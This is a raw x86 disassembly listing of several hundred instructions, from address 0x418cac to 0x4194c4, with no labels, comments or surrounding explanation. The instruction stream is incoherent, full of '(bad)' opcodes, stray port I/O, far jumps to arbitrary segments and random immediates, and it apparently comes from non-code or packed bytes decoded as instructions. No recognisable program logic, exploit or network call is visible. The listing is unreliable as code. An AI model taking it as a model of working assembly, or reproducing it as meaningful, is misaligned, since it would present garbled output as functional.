  418cac:	mov    eax,ds:0x718b0861
  418cb1:	fs and eax,0x29b78cb1
  418cb7:	mov    ah,0xc8
  418cb9:	adc    DWORD PTR ds:0xa2488090,0xffffff93
  418cc0:	fild   WORD PTR [edx+0x3d6eff0]
  418cc6:	add    al,0x9a
  418cc8:	imul   esp,DWORD PTR [esi+0x5c],0xfffffff2
  418ccc:	ss push es
  418cce:	daa    
  418ccf:	cdq    
  418cd0:	add    eax,0xda5ebfe7
  418cd5:	adc    BYTE PTR [edi],0x6f
  418cd8:	fsub   QWORD PTR [ebx-0x587f7741]
  418cde:	xchg   edx,eax
  418cdf:	out    0x42,eax
  418ce1:	sbb    al,0x88
  418ce3:	adc    BYTE PTR [edx+0x36239d2b],0x54
  418cea:	jns    0x418ca2
  418cec:	hlt    
  418ced:	cdq    
  418cee:	mov    al,ds:0xe467e6
  418cf3:	sbb    cl,cl
  418cf5:	xor    DWORD PTR ds:0x27143198,esi
  418cfb:	lock mov ecx,0xaa7f5e9d
  418d01:	xchg   ecx,eax
  418d02:	dec    eax
  418d03:	les    esi,FWORD PTR [esi-0x22]
  418d06:	lahf   
  418d07:	or     eax,0x6b96f86e
  418d0c:	jmp    0x418c93
  418d0e:	mov    eax,ds:0x58dadc04
  418d13:	pop    esi
  418d14:	imul   esi,esp,0xffffffad
  418d17:	jno    0x418ce9
  418d19:	rol    DWORD PTR [ecx-0x5bab3928],0x19
  418d20:	shr    BYTE PTR [ebx+0x3b],1
  418d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d24:	adc    ah,0x54
  418d27:	sub    BYTE PTR [edx-0x1a],ch
  418d2a:	mov    DWORD PTR [eax-0x8],ecx
  418d2d:	lods   eax,DWORD PTR ds:[esi]
  418d2e:	aas    
  418d2f:	jae    0x418d84
  418d31:	add    esp,DWORD PTR [ebx]
  418d33:	call   0xc64733ba
  418d38:	aam    0x17
  418d3a:	mov    ds:0xd6808442,eax
  418d3f:	jg     0x418d6e
  418d41:	lea    esi,[ebp-0x351e082]
  418d47:	mov    edx,0x4df590c8
  418d4c:	jo     0x418d02
  418d4e:	ret    0x46bd
  418d51:	adc    al,0xac
  418d53:	xor    bl,BYTE PTR [esi+0x65a6c615]
  418d59:	mov    eax,DWORD PTR [ecx]
  418d5b:	ss aaa 
  418d5d:	jecxz  0x418d37
  418d5f:	aas    
  418d60:	call   0x2fb8:0x1eb251d2
  418d67:	jno    0x418d49
  418d69:	xchg   BYTE PTR [eax+0xf4920a5],dl
  418d6f:	mov    ecx,0x438b855c
  418d74:	repnz push 0xfffffff8
  418d77:	push   eax
  418d78:	sbb    BYTE PTR [edx+esi*1-0x509eaf96],dh
  418d7f:	pop    es
  418d80:	(bad)  
  418d81:	or     ebp,DWORD PTR [eax-0x16]
  418d84:	je     0x418d0c
  418d86:	mov    edi,0x3b0cf03b
  418d8b:	lds    esi,FWORD PTR ds:0x20f04139
  418d91:	sbb    DWORD PTR ds:0x45b7893b,0xa889423b
  418d9b:	jne    0x418e09
  418d9d:	pop    edx
  418d9e:	cmp    BYTE PTR [edx-0x35],0x87
  418da2:	ss jb  0x418df9
  418da5:	retf   
  418da6:	aam    0x4c
  418da8:	test   eax,0x35b98984
  418dad:	in     eax,dx
  418dae:	rcr    DWORD PTR [ebp+0x31c35bed],cl
  418db4:	sub    dh,dh
  418db6:	(bad)  
  418db7:	pop    esp
  418db8:	gs inc ebx
  418dba:	cmp    BYTE PTR [ebp+0x5b7febad],0xa7
  418dc1:	xor    esi,DWORD PTR [eax+0x2b143b82]
  418dc7:	mov    edx,0xb3485362
  418dcc:	outs   dx,DWORD PTR ds:[esi]
  418dcd:	adc    ah,ah
  418dcf:	inc    esi
  418dd0:	sti    
  418dd1:	mov    ds:0xa5de7edd,al
  418dd6:	js     0x418dbd
  418dd8:	inc    ebp
  418dd9:	mov    dh,0x18
  418ddb:	jns    0x418dcd
  418ddd:	push   0x20
  418ddf:	adc    al,0x66
  418de1:	cli    
  418de2:	out    dx,al
  418de3:	push   edi
  418de4:	xor    cl,BYTE PTR [esp+ebx*1-0x3]
  418de8:	mov    bl,0x38
  418dea:	push   esp
  418deb:	or     eax,0xcc75b999
  418df0:	fstp   QWORD PTR [eax+0x7e]
  418df3:	add    al,0xdc
  418df5:	xlat   BYTE PTR ds:[ebx]
  418df6:	mov    ds:0x771a862c,eax
  418dfb:	mov    cl,0xaa
  418dfd:	inc    ebp
  418dfe:	adc    DWORD PTR [ebp+0x4374fe32],0xffffffc7
  418e05:	pop    ebp
  418e06:	jle    0x418e28
  418e08:	nop
  418e09:	test   BYTE PTR [edi-0x4a],ch
  418e0c:	fldcw  WORD PTR [edi+0xb]
  418e0f:	fwait
  418e10:	imul   edx,DWORD PTR [eax],0xffffffac
  418e13:	pushf  
  418e14:	adc    di,ax
  418e17:	push   edx
  418e18:	call   0xc8d3:0x4a3f618
  418e1f:	(bad)
  418e22:	shl    BYTE PTR [edx-0xf],1
  418e25:	sti    
  418e26:	mul    eax
  418e28:	dec    ebx
  418e29:	popa   
  418e2a:	and    BYTE PTR [edi-0x8ba63ef],al
  418e30:	scas   al,BYTE PTR es:[edi]
  418e31:	inc    edi
  418e32:	fcom   QWORD PTR [ecx-0x5c99ad33]
  418e38:	mov    ebx,0x76c2761d
  418e3d:	cli    
  418e3e:	pop    edx
  418e3f:	or     esp,ebx
  418e41:	mov    al,ds:0x4d03250
  418e46:	mov    al,ds:0x5d6aa51b
  418e4b:	mov    DWORD PTR [ecx+0x40d9302d],ebx
  418e51:	setae  BYTE PTR ds:0xc846b424
  418e58:	dec    esp
  418e59:	dec    eax
  418e5a:	pop    edi
  418e5b:	pop    ds
  418e5c:	enter  0x933f,0x4c
  418e60:	push   es
  418e61:	lods   eax,DWORD PTR ds:[esi]
  418e62:	aas    
  418e63:	jb     0x418ea5
  418e65:	iret   
  418e66:	dec    esi
  418e67:	mov    dl,0x34
  418e69:	mov    bh,0x14
  418e6b:	sub    bh,BYTE PTR ds:0xaf43889c
  418e71:	das    
  418e72:	fs dec bh
  418e75:	into   
  418e76:	clc    
  418e77:	or     ebx,eax
  418e79:	imul   edi,ecx,0xffffffca
  418e7c:	out    0x97,al
  418e7e:	test   al,0x56
  418e80:	mov    cl,0x35
  418e82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e83:	fs mov al,0x62
  418e86:	push   ebx
  418e87:	pusha  
  418e88:	hlt    
  418e89:	jmp    0xa6a7:0x7dffa2a3
  418e90:	jb     0x418e7e
  418e92:	sbb    ch,cl
  418e94:	mov    edi,0xb21b7aaa
  418e99:	in     eax,dx
  418e9a:	(bad)  
  418e9b:	(bad)  
  418e9d:	adc    ecx,ecx
  418e9f:	bound  esi,QWORD PTR [edi]
  418ea1:	push   ecx
  418ea2:	popa   
  418ea3:	aaa    
  418ea4:	loopne 0x418eed
  418ea6:	jns    0x418ed8
  418ea8:	mov    eax,0xe8803d5c
  418ead:	jg     0x418e8d
  418eaf:	xor    eax,DWORD PTR [eax-0xe]
  418eb2:	repz shr DWORD PTR [esi-0x71f07ef1],cl
  418eb9:	das    
  418eba:	adc    edi,DWORD PTR [ebx-0x452dd9c9]
  418ec0:	dec    eax
  418ec1:	jp     0x418e8b
  418ec3:	adc    eax,0x574347d0
  418ec8:	or     al,0xa3
  418eca:	js     0x418eae
  418ecc:	inc    eax
  418ecd:	xor    DWORD PTR [esi+0x1d],0x4d
  418ed1:	ficomp WORD PTR [edi-0x37]
  418ed4:	jmp    0x418e74
  418ed6:	jae    0x418eb9
  418ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eda:	and    al,0x33
  418edc:	enter  0xd2e3,0x2d
  418ee0:	imul   edx,DWORD PTR [ecx],0xffffffce
  418ee3:	and    dl,bh
  418ee5:	cmp    ah,BYTE PTR [ebp+0xe3fbd5f]
  418eeb:	ja     0x418ed6
  418eed:	and    DWORD PTR [edi+0x343f9b2e],eax
  418ef3:	loop   0x418f4d
  418ef5:	ja     0x418f1a
  418ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ef8:	inc    ebp
  418ef9:	mov    al,BYTE PTR ds:0x6170404c
  418eff:	fistp  DWORD PTR [ebp+0x24]
  418f02:	jmp    0x86df:0xb154703d
  418f09:	cld    
  418f0a:	in     al,dx
  418f0b:	mov    ?,WORD PTR [edx]
  418f0d:	and    ebp,DWORD PTR [edx+0xa6468c6]
  418f13:	xor    al,0xa8
  418f15:	and    eax,0xb4746ae3
  418f1a:	ja     0x418ec8
  418f1c:	mov    cl,0x64
  418f1e:	push   0x4f
  418f20:	inc    ebp
  418f21:	xchg   BYTE PTR [ecx+0x17],bh
  418f24:	xor    ah,BYTE PTR [ebp+0xf3e5933]
  418f2a:	cwde   
  418f2b:	xchg   ebp,eax
  418f2c:	inc    edx
  418f2d:	repnz int3 
  418f2f:	mov    ah,BYTE PTR [edx*1-0x703f3dd1]
  418f36:	es addr16 aas 
  418f39:	int3   
  418f3a:	div    DWORD PTR [edi+esi*1+0x3a604b72]
  418f41:	out    dx,eax
  418f42:	lods   eax,DWORD PTR ds:[esi]
  418f43:	test   al,0x0
  418f45:	in     eax,dx
  418f46:	ds mov esi,0x182954a
  418f4c:	loopne 0x418f2e
  418f4e:	mov    ds:0xdd875ad0,al
  418f53:	test   eax,0x4a889565
  418f58:	mov    ecx,0x8f7a4bd1
  418f5d:	jp     0x418f85
  418f5f:	out    0x82,eax
  418f61:	rcr    eax,1
  418f63:	cmc    
  418f64:	fldcw  WORD PTR [ebx+esi*2-0x5212f5fc]
  418f6b:	rcr    DWORD PTR [esi+esi*8],0x6c
  418f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f70:	push   cs
  418f71:	jl     0x418fb3
  418f73:	xor    esi,DWORD PTR [edi]
  418f75:	pop    ecx
  418f76:	mov    DWORD PTR [esi+ebx*8+0x41cd4684],eax
  418f7d:	or     bh,BYTE PTR [ebx+0x37]
  418f80:	icebp  
  418f81:	or     ch,BYTE PTR [ebx-0x20]
  418f84:	pop    ds
  418f85:	(bad)  
  418f86:	fbstp  TBYTE PTR [ecx+0x1ab424b2]
  418f8c:	jg     0x418f5d
  418f8e:	mov    ch,0x1f
  418f90:	aam    0x79
  418f92:	jbe    0x418fd2
  418f94:	dec    eax
  418f95:	and    dh,dh
  418f97:	cmovbe edi,DWORD PTR [ebx-0x552c481b]
  418f9e:	or     DWORD PTR [esi+0x4712512],esi
  418fa4:	adc    BYTE PTR [esi+esi*4-0x65],dl
  418fa8:	mov    dh,0xd4
  418faa:	enter  0xb664,0xe5
  418fae:	mov    ds:0xc35278d8,eax
  418fb3:	sbb    al,BYTE PTR [edi-0x56]
  418fb6:	jl     0x418fc3
  418fb8:	xchg   ebp,eax
  418fb9:	(bad)  
  418fba:	mov    ecx,0x7b68624a
  418fbf:	push   ds
  418fc0:	ja     0x419004
  418fc2:	sub    eax,0x8170c9c2
  418fc7:	sub    BYTE PTR ds:0xb78fa0c1,bh
  418fcd:	xlat   BYTE PTR ds:[ebx]
  418fce:	cmp    dl,BYTE PTR [ebp-0x42]
  418fd1:	mov    gs,WORD PTR [esi]
  418fd3:	xor    DWORD PTR [ecx+0x185da9ec],ecx
  418fd9:	push   0x43
  418fdb:	lock cdq 
  418fdd:	(bad)  
  418fde:	or     ebx,DWORD PTR [esi]
  418fe0:	mov    cl,0x7b
  418fe2:	xchg   ebx,eax
  418fe3:	cmc    
  418fe4:	pop    esi
  418fe5:	stc    
  418fe6:	test   al,0xee
  418fe8:	sub    esi,DWORD PTR [edx-0x16181217]
  418fee:	mov    bh,0xad
  418ff0:	cmc    
  418ff1:	out    0x10,eax
  418ff3:	aaa    
  418ff4:	test   al,0x17
  418ff6:	pushf  
  418ff7:	cdq    
  418ff8:	or     DWORD PTR [edi],ebp
  418ffa:	ret    
  418ffb:	leave  
  418ffc:	cmp    DWORD PTR [ebx],0xdf91518d
  419002:	test   DWORD PTR [eax+0x27],ebp
  419005:	xchg   esi,eax
  419006:	jb     0x418fcc
  419008:	push   es
  419009:	adc    al,0xfc
  41900b:	cmp    edi,DWORD PTR [ecx+ecx*4]
  41900e:	mov    DWORD PTR [edi],ebx
  419010:	test   dh,bh
  419012:	arpl   WORD PTR [edi-0xa],dx
  419015:	imul   esi,DWORD PTR [ecx+0x4e],0x29
  419019:	inc    edx
  41901a:	sub    al,0x84
  41901c:	leave  
  41901d:	ins    BYTE PTR es:[edi],dx
  41901e:	add    eax,0x4051684d
  419023:	clc    
  419024:	mov    edx,0x7c2014eb
  419029:	jmp    0x66f32c71
  41902e:	cmp    al,0xab
  419030:	cmc    
  419031:	cdq    
  419032:	push   edi
  419033:	leave  
  419034:	lds    ebx,FWORD PTR [edi]
  419036:	out    dx,al
  419037:	test   DWORD PTR [eax+0x5a],ecx
  41903a:	jmp    0xb62:0xe693fdac
  419041:	inc    esp
  419042:	dec    esp
  419043:	mul    dl
  419045:	stc    
  419046:	mov    ah,0x23
  419048:	rol    BYTE PTR [edi+0x18b7a49],cl
  41904e:	fcmovu st,st(6)
  419050:	retf   0x288d
  419053:	cmp    al,0xa1
  419055:	sahf   
  419056:	imul   BYTE PTR [eax+0x20]
  419059:	loope  0x4190b8
  41905b:	adc    bh,BYTE PTR [ecx+ecx*2+0x49]
  41905f:	or     al,BYTE PTR es:[ecx]
  419062:	dec    ebp
  419063:	gs gs and al,0x13
  419067:	dec    ebp
  419068:	stc    
  419069:	mov    ebx,0x82a59919
  41906e:	jnp    0x4190e8
  419070:	fldz   
  419072:	out    dx,al
  419073:	fwait
  419074:	push   eax
  419075:	mov    bl,0x93
  419077:	adc    edx,DWORD PTR [ebp+0x2ee75f77]
  41907d:	int    0x23
  41907f:	inc    ebp
  419080:	pop    ss
  419081:	mov    al,ds:0x4dd6e84f
  419086:	xor    ecx,eax
  419088:	imul   eax,DWORD PTR [esi+ecx*2+0x360480ed],0xd5e32302
  419093:	pop    esi
  419094:	add    DWORD PTR [esi],0x39222ac7
  41909a:	out    0x9,eax
  41909c:	mov    edi,0x21898047
  4190a1:	loop   0x419029
  4190a3:	push   ebx
  4190a4:	in     al,0x5b
  4190a6:	pop    eax
  4190a7:	or     BYTE PTR [edi+0x5a],bh
  4190aa:	add    al,0xc8
  4190ac:	loopne 0x4190fa
  4190ae:	and    DWORD PTR [bx+si-0x5507],0xffffffb7
  4190b4:	jns    0x419110
  4190b6:	or     BYTE PTR [eax],cl
  4190b8:	jmp    0x4190ff
  4190ba:	adc    BYTE PTR [esi-0x54],ah
  4190bd:	sub    al,0xc4
  4190bf:	idiv   DWORD PTR [ebx-0x17]
  4190c2:	dec    esi
  4190c3:	call   DWORD PTR [eax+0x190eae2d]
  4190c9:	test   DWORD PTR [ecx-0x34],ebp
  4190cc:	inc    esi
  4190cd:	adc    DWORD PTR [ecx+ecx*1-0x53549522],eax
  4190d4:	ins    DWORD PTR es:[edi],dx
  4190d5:	ret    
  4190d6:	not    BYTE PTR [edx]
  4190d8:	and    bl,BYTE PTR [edi-0x58ec6c1c]
  4190de:	xchg   edx,eax
  4190df:	mov    dh,0xa8
  4190e1:	dec    ebp
  4190e2:	cs popf 
  4190e4:	(bad)  [ebx+0x30]
  4190e7:	pop    esp
  4190e8:	inc    ecx
  4190e9:	adc    dh,BYTE PTR [esi-0x3a]
  4190ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190ed:	inc    edx
  4190ee:	jne    0x419143
  4190f0:	mov    dh,0x2a
  4190f2:	adc    WORD PTR [esi+0xa],dx
  4190f6:	dec    esi
  4190f7:	push   ss
  4190f8:	cmp    DWORD PTR [edx+ebp*2+0x4d],eax
  4190fc:	scas   eax,DWORD PTR es:[edi]
  4190fd:	dec    eax
  4190fe:	shr    BYTE PTR [edx+0x17c92d24],1
  419104:	(bad)  
  419105:	in     eax,0x59
  419107:	mov    ebp,0xb5ae752f
  41910c:	sbb    al,0xa4
  41910e:	out    0xfb,eax
  419110:	and    ebp,DWORD PTR [eax-0x913a6bc]
  419116:	es gs call 0xb53b9622
  41911d:	ja     0x419136
  41911f:	add    esi,ecx
  419121:	(bad)  
  419122:	enter  0xff57,0xd4
  419126:	les    esi,FWORD PTR [esp+esi*4-0xa4ed6be]
  41912d:	das    
  41912e:	call   DWORD PTR ss:[ebx+0x74e39f53]
  419135:	jmp    0x4190c8
  419137:	mov    esp,0x96b71b66
  41913c:	lea    esi,ds:0xb4c59301
  419142:	lea    edx,[ebp-0x1d2618dc]
  419148:	mov    ebp,0x55037556
  41914d:	(bad)  
  41914e:	popf   
  41914f:	jge    0x419172
  419151:	sbb    DWORD PTR [eax],eax
  419153:	pusha  
  419154:	jecxz  0x41919a
  419156:	adc    eax,0x11edd953
  41915b:	lods   al,BYTE PTR ds:[esi]
  41915c:	lahf   
  41915d:	aas    
  41915e:	leave  
  41915f:	and    ch,BYTE PTR [ebx]
  419161:	inc    ebx
  419162:	pushf  
  419163:	jns    0x419153
  419165:	mov    al,ds:0x4e8d883a
  41916a:	pop    esi
  41916b:	jae    0x41917e
  41916d:	pop    ebx
  41916e:	retf   0x3059
  419171:	cmp    eax,0xdf2d08bb
  419176:	mov    BYTE PTR [ebx],dh
  419178:	daa    
  419179:	not    ebx
  41917b:	lods   al,BYTE PTR ds:[esi]
  41917c:	push   ss
  41917d:	mov    ds:0x8783b58e,eax
  419182:	sbb    DWORD PTR [ebx+0x2c],ebx
  419185:	adc    ch,BYTE PTR [edx]
  419187:	sbb    edx,DWORD PTR [ebp-0x6d]
  41918a:	cs sbb eax,0xccb89d4c
  419190:	cld    
  419191:	push   0x2d34d1f6
  419196:	mov    ebx,0xc5b777d1
  41919b:	push   edi
  41919c:	ret    0x92a8
  41919f:	mov    dl,0x80
  4191a1:	cwde   
  4191a2:	inc    eax
  4191a3:	and    ebp,DWORD PTR [eax]
  4191a5:	fldcw  WORD PTR [eax+edx*8]
  4191a8:	in     al,dx
  4191a9:	in     eax,0xbd
  4191ab:	mov    edi,0x99f4ea20
  4191b0:	jl     0x4191e3
  4191b2:	hlt    
  4191b3:	xchg   ecx,eax
  4191b4:	and    DWORD PTR [ebx+0x9],esi
  4191b7:	cmp    bl,BYTE PTR [eax-0x6daed0cc]
  4191bd:	shl    BYTE PTR [ecx-0x66e6d8d3],0xc4
  4191c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191c5:	clc    
  4191c6:	jg     0x4191f3
  4191c8:	mov    ds:0x1597bd00,eax
  4191cd:	xchg   esp,eax
  4191ce:	(bad)  
  4191cf:	xor    BYTE PTR [ecx-0x785b9ff9],dh
  4191d5:	repz test DWORD PTR [ebx+0x4b],ecx
  4191d9:	test   DWORD PTR [ebp+eiz*2-0x4ed52608],esi
  4191e0:	xor    BYTE PTR [edx],0xfa
  4191e3:	retf   
  4191e4:	mov    bh,0x70
  4191e6:	mov    BYTE PTR [edi+ebx*8],al
  4191e9:	leave  
  4191ea:	lods   eax,DWORD PTR ds:[esi]
  4191eb:	cmc    
  4191ec:	jno    0x4191dc
  4191ee:	leave  
  4191ef:	pop    edi
  4191f0:	cmp    dl,BYTE PTR [esi+esi*8]
  4191f3:	push   ds
  4191f4:	pop    edx
  4191f5:	(bad)  
  4191f6:	mov    eax,ds:0x1d1b2d3a
  4191fb:	dec    esi
  4191fc:	fcomp  DWORD PTR ds:0x2d973eaa
  419202:	cli    
  419203:	outs   dx,BYTE PTR ds:[esi]
  419204:	adc    cl,BYTE PTR [eax+eiz*8-0x2]
  419208:	xor    al,0xd9
  41920a:	das    
  41920b:	inc    ecx
  41920c:	lods   eax,DWORD PTR ds:[esi]
  41920d:	dec    esi
  41920e:	dec    edx
  41920f:	push   0x13081d8a
  419214:	mov    WORD PTR [ebx+0x6],?
  419217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419218:	imul   ebp,DWORD PTR [ebx-0x717fc3eb],0xc36dc34f
  419222:	repnz push ss
  419224:	stc    
  419225:	daa    
  419226:	xchg   eax,ecx
  419228:	sar    BYTE PTR [ebp+ebp*2+0x47e2ed90],cl
  41922f:	dec    esp
  419230:	or     eax,0x84a3e78
  419235:	mov    eax,ds:0x40eb57e9
  41923a:	ss mov eax,0x3a971895
  419240:	aas    
  419241:	dec    BYTE PTR [ecx]
  419243:	jge    0x4191ea
  419245:	mov    ecx,0xb70c3627
  41924a:	push   esi
  41924b:	js     0x4192a3
  41924d:	lea    eax,[eax-0x7c]
  419250:	test   eax,0x71813e22
  419255:	push   edi
  419256:	(bad)  
  419257:	xchg   edx,eax
  419258:	mov    esp,0x1f677249
  41925d:	xchg   edx,eax
  41925e:	push   esi
  41925f:	popa   
  419260:	scas   eax,DWORD PTR es:[edi]
  419261:	shr    DWORD PTR [ecx+0x7bfc2929],cl
  419267:	or     eax,0x11bd4110
  41926c:	scas   al,BYTE PTR es:[edi]
  41926d:	ins    BYTE PTR es:[edi],dx
  41926e:	dec    eax
  41926f:	inc    ebp
  419270:	js     0x419214
  419272:	sbb    al,0x4d
  419274:	cmp    ah,cl
  419276:	inc    ebx
  419277:	mov    al,0x38
  419279:	popa   
  41927a:	xor    esi,esp
  41927c:	rol    bh,1
  41927e:	ss dec ebx
  419280:	inc    ebx
  419281:	(bad)  
  419282:	fcom   QWORD PTR [edi+0x6fa2dfbd]
  419288:	or     edx,DWORD PTR [eax+0x77]
  41928b:	(bad)  
  41928d:	sbb    dh,bh
  41928f:	xor    eax,0x3bc80539
  419294:	add    DWORD PTR [esi-0x26],edi
  419297:	sub    DWORD PTR [edi-0x3e39851b],ecx
  41929d:	fidiv  DWORD PTR [edi]
  41929f:	call   0xc6b7:0x10bdb982
  4192a6:	es test eax,0xecc5dda2
  4192ac:	dec    edx
  4192ad:	pop    ds
  4192ae:	adc    eax,0xf7622c5f
  4192b3:	cmp    cl,cl
  4192b5:	mov    ebx,0xf1b93d6c
  4192ba:	imul   eax,edx,0xffffff98
  4192bd:	dec    edi
  4192be:	popa   
  4192bf:	push   es
  4192c0:	es xor ebx,ecx
  4192c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192c4:	xchg   edx,eax
  4192c5:	xor    edx,DWORD PTR [edx+eiz*1+0x61c8fa4]
  4192cc:	mov    ch,0x92
  4192ce:	xor    ebp,DWORD PTR [edx+edi*4]
  4192d1:	xor    bh,BYTE PTR [ecx*2+0x4ff26a85]
  4192d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192da:	mov    BYTE PTR [eax-0x2b],dl
  4192dd:	in     eax,0x2f
  4192df:	push   eax
  4192e0:	push   esi
  4192e1:	cwde   
  4192e2:	cwde   
  4192e3:	icebp  
  4192e4:	sbb    DWORD PTR [edi],ebx
  4192e6:	cwde   
  4192e7:	inc    esp
  4192e8:	lods   al,BYTE PTR ds:[esi]
  4192e9:	dec    edi
  4192ea:	or     al,0xd4
  4192ec:	test   BYTE PTR [edi+0x58],0xfa
  4192f0:	sub    al,0xa
  4192f2:	lahf   
  4192f3:	jmp    0xdb7d:0x5a243d81
  4192fa:	mov    edi,0x161cc350
  4192ff:	mov    ch,0x78
  419301:	stc    
  419302:	mov    ds:0xd330ab03,al
  419307:	mov    al,0xa9
  419309:	in     al,0x6a
  41930b:	xchg   edi,eax
  41930c:	add    ch,ah
  41930e:	gs pop ecx
  419310:	into   
  419311:	sbb    esi,edi
  419313:	fild   DWORD PTR [edx-0x7c9eb76]
  419319:	cmp    DWORD PTR [edi],esi
  41931b:	call   DWORD PTR [eax-0x23b8c9cd]
  419321:	mov    eax,ds:0xeb5a5560
  419326:	xor    al,0x52
  419328:	push   edi
  419329:	and    dl,BYTE PTR [esi-0x2dac1ccc]
  41932f:	and    al,0xea
  419331:	adc    BYTE PTR [eax+0x5b08133e],al
  419337:	pop    esp
  419338:	out    dx,al
  419339:	cs mov dh,0x36
  41933c:	cmp    BYTE PTR [eax],al
  41933e:	hlt    
  41933f:	ins    DWORD PTR es:[edi],dx
  419340:	adc    bl,0x94
  419343:	sbb    DWORD PTR [ecx+0x11b7f1e0],esi
  419349:	sub    edi,DWORD PTR [ecx]
  41934b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41934d:	cmp    eax,0xcc0e4bd1
  419352:	mov    BYTE PTR [edi],0x7c
  419355:	adc    DWORD PTR [edi+0x1e],edi
  419358:	sub    ebp,ebp
  41935a:	add    eax,0x699924f1
  41935f:	mov    ebp,0xee64ff76
  419364:	mov    esp,eax
  419366:	repz push esi
  419368:	xor    ecx,DWORD PTR [esi+0x325ed7c9]
  41936e:	mov    dh,0xaf
  419370:	inc    edx
  419371:	lds    edi,FWORD PTR ss:[esi+0x3e]
  419375:	mul    DWORD PTR [ecx-0x60bbae44]
  41937b:	and    BYTE PTR ds:0x2ec7cf82,ah
  419381:	sub    eax,0xccef41ee
  419386:	fld    DWORD PTR [ecx+ebx*4+0x672aa966]
  41938d:	pop    es
  41938e:	cwde   
  41938f:	push   eax
  419390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419391:	outs   dx,BYTE PTR ds:[esi]
  419392:	xor    dh,0x6a
  419395:	xchg   esi,eax
  419396:	cmp    al,BYTE PTR [ebx-0x2]
  419399:	jmp    0xe915bec4
  41939e:	sub    eax,0x51a4025c
  4193a3:	js     0x419333
  4193a5:	inc    ebp
  4193a6:	or     BYTE PTR [eax],ah
  4193a8:	mov    ebx,0xe3173214
  4193ad:	nop
  4193ae:	jo     0x4193c5
  4193b0:	push   0x70
  4193b2:	inc    eax
  4193b3:	int    0xc3
  4193b5:	jo     0x41940e
  4193b7:	inc    ecx
  4193b8:	xchg   ecx,eax
  4193b9:	jge    0x41936a
  4193bb:	xor    al,0x3a
  4193bd:	jmp    0x9f656f0a
  4193c2:	fdiv   QWORD PTR [esi]
  4193c4:	in     al,dx
  4193c5:	imul   ecx,DWORD PTR [edx-0x52],0x11
  4193c9:	pop    esp
  4193ca:	push   ebp
  4193cb:	retf   0xd01f
  4193ce:	adc    edx,DWORD PTR [ebp-0x47cf1f80]
  4193d4:	mov    ch,0xd2
  4193d6:	in     eax,dx
  4193d7:	in     eax,dx
  4193d8:	imul   ebp,DWORD PTR [ecx+edi*4-0x13],0xe56886de
  4193e0:	sti    
  4193e1:	rol    DWORD PTR [ebp+eiz*2-0x23],1
  4193e5:	cdq    
  4193e6:	fidivr WORD PTR [edx+0x11]
  4193e9:	dec    ebx
  4193ea:	imul   ebx,ebp,0x767656d9
  4193f0:	mov    ah,0x8a
  4193f2:	pop    ds
  4193f3:	add    eax,0x5c1950b8
  4193f8:	jl     0x4193dd
  4193fa:	mov    esp,0x7dcc9b9c
  4193ff:	repnz pop ecx
  419401:	ficom  DWORD PTR [ecx+0x72]
  419404:	sub    BYTE PTR [ebx+eiz*2+0x4e],dl
  419408:	aam    0x81
  41940a:	iret   
  41940b:	leave  
  41940c:	xchg   edi,eax
  41940d:	aad    0xa
  41940f:	lods   al,BYTE PTR ds:[esi]
  419410:	addr16 cwde 
  419412:	cmp    al,0x30
  419414:	adc    BYTE PTR [ecx],dh
  419416:	mov    ah,0x54
  419418:	adc    al,0xde
  41941a:	xchg   esi,eax
  41941b:	inc    ebx
  41941c:	inc    ebp
  41941d:	or     BYTE PTR [ebx],ch
  41941f:	bound  esp,QWORD PTR [eax-0x2a]
  419422:	into   
  419423:	scas   eax,DWORD PTR es:[edi]
  419424:	push   es
  419425:	loopne 0x4193af
  419427:	mov    ecx,0x147d2c84
  41942c:	jnp    0x41943d
  41942e:	sbb    dh,ah
  419430:	jbe    0x419411
  419432:	push   0xa86c710e
  419437:	lahf   
  419438:	jmp    0x119842ef
  41943d:	jno    0x419417
  41943f:	inc    eax
  419440:	sbb    DWORD PTR [ebp+0x3f],esp
  419443:	pop    ebp
  419444:	out    dx,eax
  419445:	jne    0x41945b
  419447:	iret   
  419448:	jl     0x4194b4
  41944a:	das    
  41944b:	inc    ecx
  41944c:	ins    DWORD PTR es:[edi],dx
  41944d:	lods   al,BYTE PTR ds:[esi]
  41944e:	cwde   
  41944f:	out    0x9,al
  419451:	mov    cl,dl
  419453:	jmp    0x478c0bce
  419458:	jge    0x4194c4
  41945a:	mov    eax,DWORD PTR [ebx+0x3df687e1]
  419460:	mov    bh,0xf4
  419462:	jmp    0x9185cff
  419467:	and    edx,DWORD PTR [esp+ebx*1+0x25]
  41946b:	shr    ch,0xd0
  41946e:	jb     0x41944c
  419470:	pop    edx
  419471:	cld    
  419472:	mov    ds:0x3ffc8e0e,eax
  419477:	mov    BYTE PTR [ebp+0x64861e45],dh
  41947d:	(bad)  [ebx-0x2a68dfda]
  419483:	mov    dh,0xf2
  419485:	push   esp
  419486:	adc    eax,0xe105d338
  41948b:	mov    ss,WORD PTR [eax]
  41948d:	add    DWORD PTR [ebx+0x64],0x163d120b
  419494:	stos   BYTE PTR es:[edi],al
  419495:	out    0xa2,eax
  419497:	sub    DWORD PTR [edx-0x466f0b56],0xffffffaf
  41949e:	and    esp,DWORD PTR [ecx]
  4194a0:	xchg   DWORD PTR [eax-0x6522341],ebp
  4194a6:	sbb    BYTE PTR [edx+esi*8-0x4b644c10],ch
  4194ad:	repz push esi
  4194af:	or     al,0x29
  4194b1:	sbb    dh,BYTE PTR [edx]
  4194b3:	add    DWORD PTR [ecx+0x46],0xffffffb4
  4194b7:	ins    WORD PTR es:[edi],dx
  4194b9:	pcmpeqd mm1,QWORD PTR [ebx+0x4405b65d]
  4194c0:	push   ds
  4194c1:	fwait
  4194c2:	ja     0x419495
  4194c4:	(bad)  
